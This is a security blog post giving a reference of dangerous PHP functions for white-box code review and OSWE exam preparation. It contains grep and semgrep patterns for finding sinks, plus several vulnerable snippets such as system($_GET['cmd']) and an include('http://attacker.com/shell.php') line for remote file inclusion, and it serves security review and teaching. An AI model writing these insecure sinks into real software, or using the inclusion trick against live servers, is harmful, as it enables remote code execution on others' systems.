---
title: "Dangerous PHP Functions: Code Execution and Exploitation Reference"
date: 2021-01-25
lastmod: 2025-06-13
description: "Complete reference of PHP functions exploitable for RCE, LFI, information disclosure and filesystem manipulation. Includes grep and semgrep patterns for source code review, PHP version notes, and exploitation context for OSWE/AWAE."
categories: [Web, Exploit Development]
tags: [oswe, awae, php, rce, web-security, code-execution, code-review, semgrep]
author: z-r0crypt
featured: false
draft: false
summary: "PHP dangerous function reference for source code review and exploitation. Covers command execution, code evaluation, callbacks, filesystem, and information disclosure — with grep/semgrep patterns and PHP version compatibility notes."
---

## Overview

This is a reference for identifying and exploiting dangerous PHP functions during white-box web application penetration testing. Originally compiled during OSWE/AWAE preparation, updated with code review patterns and PHP version notes.

**How to use this post:**
- During **source code review** — use the grep/semgrep patterns to find sinks quickly
- During **exploitation** — use the function descriptions to understand what's exploitable and how
- During **OSWE exam** — functions here are exactly what you're hunting for in each target application

> **Attribution:** Core function list adapted from [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html) and [StackOverflow](https://stackoverflow.com/a/3697776). Code review patterns and version notes added here.

---

## Finding These Functions: grep and Semgrep Patterns

Before diving into the function list, here are the patterns to use during code review.

### Quick grep — find all dangerous function calls

```bash
# Command execution functions
grep -rn "exec\|passthru\|system\|shell_exec\|popen\|proc_open\|pcntl_exec" \
  --include="*.php" /path/to/source/

# Code execution / eval sinks
grep -rn "eval\|assert\|create_function\|preg_replace" \
  --include="*.php" /path/to/source/

# File inclusion sinks (LFI/RFI)
grep -rn "include\|require\|include_once\|require_once" \
  --include="*.php" /path/to/source/

# User input reaching dangerous functions (taint)
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE\|\$_SERVER" \
  --include="*.php" /path/to/source/ | grep -i "exec\|eval\|system\|include"

# Callbacks with user input
grep -rn "call_user_func\|array_map\|array_filter\|usort\|preg_replace_callback" \
  --include="*.php" /path/to/source/
```

### Semgrep — semantic pattern matching

Install: `pip install semgrep`

```bash
# Run official PHP security ruleset
semgrep --config "p/php" /path/to/source/

# Run with community security rules
semgrep --config "p/security-audit" /path/to/source/

# Target only RCE sinks
semgrep --config r/php.lang.security.exec-use /path/to/source/
```

Custom semgrep rule to find user input reaching `exec`:

```yaml
rules:
  - id: user-input-to-exec
    languages: [php]
    severity: ERROR
    message: User input reaches exec() - potential RCE
    patterns:
      - pattern: exec($INPUT, ...)
      - pattern-either:
          - pattern: $INPUT = $_GET[...]
          - pattern: $INPUT = $_POST[...]
          - pattern: $INPUT = $_REQUEST[...]
```

Save as `rce.yml` and run: `semgrep --config rce.yml /path/to/source/`

---

## Severity Reference

Quick triage guide — not all dangerous functions are equally exploitable:

| Severity | Functions | Why |
|---|---|---|
| CRITICAL | `eval`, `assert`, `system`, `exec`, `passthru`, `shell_exec`, backticks | Direct code/command execution with user input = instant RCE |
| CRITICAL | `include`, `require` + user input | LFI to RCE if log poisoning or file upload possible |
| HIGH | `preg_replace` with `/e` (PHP < 7.0) | Eval on regex match — removed in PHP 7 |
| HIGH | `create_function` (PHP < 8.0) | Wrapper for eval — removed in PHP 8 |
| HIGH | `call_user_func`, `array_map`, `usort` + user-controlled callback | Callback injection |
| MEDIUM | `file_put_contents`, `move_uploaded_file`, `copy` | Arbitrary file write — RCE if webroot writable |
| MEDIUM | `unserialize` | PHP object injection — see deserialization attacks |
| LOW | `phpinfo`, `getenv`, `get_cfg_var` | Information disclosure only |

---

## Command Execution

Direct OS command execution. If any of these receive unsanitised user input, it is RCE.

```php
exec()           // Returns last line of output — no direct output to browser
passthru()       // Passes raw output directly to browser — useful for binary output
system()         // Passes output to browser AND returns last line
shell_exec()     // Returns entire output as a string
``               // Backtick operator — identical to shell_exec()
popen()          // Opens a pipe to a process — read or write
proc_open()      // Like popen() but with more control over stdin/stdout/stderr
pcntl_exec()     // Executes a program, replacing current process
```

**PHP version notes:**
- All functions above exist in PHP 5, 7, and 8
- `pcntl_exec()` requires the `pcntl` extension — not enabled by default on Windows

**Exploitation context:**
If you find `system($_GET['cmd'])` or similar, you have immediate RCE. Look for user input flowing into any of these via variable assignment, string concatenation, or function return values.

---

## PHP Code Execution

These functions evaluate PHP code at runtime. User input reaching these = RCE.

```php
eval()                              // Executes string as PHP code
assert()                            // In PHP < 8: identical to eval() when passed a string
preg_replace('/.*/e', $input, ...) // /e modifier evals the replacement — REMOVED in PHP 7.0
create_function()                   // Creates anonymous function via eval — REMOVED in PHP 8.0
include($input)                     // Executes included file as PHP — LFI/RFI if user-controlled
include_once($input)
require($input)
require_once($input)
$_GET['func_name']($_GET['argument'])  // Dynamic function call — common in poorly written apps
$func = new ReflectionFunction($_GET['func_name']); $func->invoke();
```

**PHP version compatibility:**

| Function | PHP 5 | PHP 7 | PHP 8 |
|---|---|---|---|
| `eval()` | yes | yes | yes |
| `assert()` as eval | yes | deprecated | removed |
| `preg_replace /e` | yes | removed in 7.0 | no |
| `create_function()` | yes | deprecated | removed in 8.0 |

**Exploitation context:**
`assert()` deserves special attention — in PHP 5 and early PHP 7, passing a string to `assert()` evaluates it as PHP code. This is frequently missed in code review because developers use it for debugging. Look for `assert($input)` with any user-controlled `$input`.

---

## Callback Functions

These functions accept a callable as a parameter. If the callable is user-controlled, it can be used to call arbitrary functions including `phpinfo()`, `system()`, or `eval()`.

```php
// Common callback sinks
call_user_func($callback, $arg)        // Calls $callback with $arg
call_user_func_array($callback, $args) // Calls $callback with array of args
array_map($callback, $array)           // Applies $callback to each element
array_filter($array, $callback)        // Filters using $callback
usort($array, $callback)               // Sorts using $callback comparator
uasort($array, $callback)
uksort($array, $callback)
preg_replace_callback($pattern, $callback, $subject)
array_walk($array, $callback)
array_walk_recursive($array, $callback)

// Less obvious callback sinks
ob_start($callback)                    // Output buffer handler
register_shutdown_function($callback)  // Called on script termination
register_tick_function($callback)      // Called on each tick
set_error_handler($callback)           // Custom error handler
set_exception_handler($callback)       // Custom exception handler
spl_autoload_register($callback)       // Autoloader registration
iterator_apply($iterator, $callback)

// Callback argument positions (for manual analysis)
'ob_start'                   => 0
'array_filter'               => 1
'array_map'                  => 0
'array_reduce'               => 1
'array_walk'                 => 1
'call_user_func'             => 0
'call_user_func_array'       => 0
'usort'                      => 1
'preg_replace_callback'      => 1
'session_set_save_handler'   => array(0, 1, 2, 3, 4, 5)
```

**Exploitation context:**
If you find `call_user_func($_GET['func'], $_GET['arg'])`, you can call `system` with any command. Even without argument control, calling `phpinfo` confirms the vulnerability. During OSWE, look for deserialization gadget chains that terminate in callback functions.

---

## Information Disclosure

These don't provide code execution directly but leak configuration, paths, and credentials useful for chaining attacks.

```php
phpinfo()           // Full PHP configuration — reveals paths, extensions, disable_functions
getenv()            // Read environment variables — may contain DB passwords, API keys
get_cfg_var()       // Read php.ini values
get_current_user()  // Returns username of PHP process owner
getcwd()            // Current working directory — reveals webroot path
disk_free_space()
disk_total_space()
proc_get_status()   // Information about process opened by proc_open()
posix_getlogin()    // Username of process
posix_ttyname()     // Terminal device name
getlastmo()         // Last modification time of page
getmygid()          // GID of PHP process
getmyinode()        // Inode of current script
getmypid()          // PID of PHP process
getmyuid()          // UID of PHP process
```

**Exploitation context:**
`phpinfo()` exposed publicly is always a finding. It reveals `disable_functions` (what's blocked), `open_basedir` (path restrictions), server paths, and loaded extensions. This directly informs your exploitation approach when other functions are disabled.

---

## Filesystem Functions

**Write operations** — arbitrary file write to webroot = RCE:

```php
file_put_contents($path, $data)  // Write data to file — RCE if webroot writable
move_uploaded_file($tmp, $dest)  // Move uploaded file — file upload bypass
copy($src, $dest)                // Copy file — with allow_url_fopen: copy remote PHP to webroot
rename($old, $new)               // Rename/move file
symlink($target, $link)          // Create symlink — path traversal amplifier
touch($path)                     // Create empty file
unlink($path)                    // Delete file — denial of service
mkdir($path)                     // Create directory
chmod($path, $mode)              // Change permissions
chown($path, $user)              // Change ownership
```

**Read operations** — information disclosure, LFI:

```php
file_get_contents($path)         // Read file contents — LFI if user-controlled
file($path)                      // Read file into array
readfile($path)                  // Output file contents directly
highlight_file($path)            // Output file with syntax highlighting — shows source
show_source($path)               // Alias for highlight_file()
parse_ini_file($path)            // Parse .ini file — read config files
glob($pattern)                   // Find files matching pattern — directory listing
fopen($path, $mode)              // Open file handle
```

**PHP version notes:**
- `allow_url_fopen` and `allow_url_include` control whether URLs can be used as file paths — disabled by default in modern PHP but worth checking in older applications
- If `allow_url_include=On`, `include('http://attacker.com/shell.php')` gives RFI to RCE

**Exploitation context:**
`copy($_GET['s'], $_GET['d'])` with `allow_url_fopen=On` allows copying a remote PHP file to the webroot. Also look for `file_put_contents` with user-controlled filename — if you can write a `.php` file to the webroot, you have RCE.

---

## Other Notable Functions

```php
extract($array)     // Imports array keys as variables — register_globals-style vuln
parse_str($string)  // Parses query string into variables — same risk as extract()
putenv($setting)    // Set environment variable — can affect child process behaviour
ini_set($key, $val) // Change php.ini at runtime — can re-enable dangerous settings
mail($to, $subj, $body, $headers)  // CRLF injection in 5th param
header($string)     // CRLF injection in older PHP — XSS or header injection
unserialize($data)  // PHP object injection — see deserialization attacks
```

**Exploitation context:**
`extract($_GET)` is particularly dangerous — it turns all GET parameters into local variables, potentially overwriting `$admin`, `$authenticated`, or any other variable used in access control logic. Appears frequently in legacy PHP applications.

---

## Code Review Workflow

When auditing a PHP application for OSWE, work in this order:

1. **Find sinks** — grep for dangerous function calls across the codebase
2. **Trace backwards** — follow the variable back to where user input enters
3. **Check sanitisation** — look for `escapeshellarg()`, `htmlspecialchars()`, `intval()` between source and sink
4. **Identify the chain** — what HTTP parameter reaches the sink and how?
5. **Automate the exploit** — OSWE expects a working end-to-end script, not manual steps

```bash
# Step 1: Find sinks
grep -rn "system\|exec\|eval\|include\|shell_exec" --include="*.php" . > sinks.txt

# Step 2: For each sink, find where the argument comes from
grep -n "system(" . -r --include="*.php"

# Step 3: Check if input is sanitised between source and sink
grep -rn "escapeshellarg\|escapeshellcmd\|filter_input\|htmlspecialchars" \
  --include="*.php" .
```

---

## References

- [OWASP PHP Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/PHP_Configuration_Cheat_Sheet.html)
- [StackOverflow: PHP dangerous functions](https://stackoverflow.com/a/3697776) — original source for function list
- [Semgrep PHP rules](https://semgrep.dev/p/php) — community ruleset for PHP security
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#php) — exploitation payloads
- [php.net disable_functions](https://www.php.net/manual/en/ini.core.php#ini.disable-functions) — how to check what is blocked